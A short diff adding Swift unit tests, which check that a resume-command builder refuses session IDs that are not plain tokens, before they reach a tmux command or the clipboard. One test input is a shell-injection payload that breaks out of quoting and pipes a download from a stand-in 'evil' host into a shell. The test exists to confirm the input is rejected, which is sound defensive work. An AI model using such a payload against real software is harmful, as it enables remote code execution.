@@ -40,5 +40,14 @@ func resumeCommandSuite() {
 
         T.eq(ResumeCommand.tmux(project: "p", cwd: nil, agent: "codex", sessionID: id), nil,
              "no resume syntax means no tmux command either")
+
+        // The id was the ONE hook-file field reaching the clipboard unquoted, inside the literal
+        // single quotes `tmux` wraps the command in. Refused, the way AgentTranscript.find
+        // refuses the same field, rather than quoted.
+        T.eq(ResumeCommand.resume(agent: "claude", sessionID: "x'; curl evil | sh; :'"), nil,
+             "a session id that is not a plain token yields no command at all")
+        T.eq(ResumeCommand.tmux(project: "p", cwd: "/x", agent: "claude", sessionID: "a b"), nil,
+             "and so the tmux form refuses it too")
+        T.eq(ResumeCommand.resume(agent: "claude", sessionID: ""), nil, "an empty id is not a session")
     }
 }
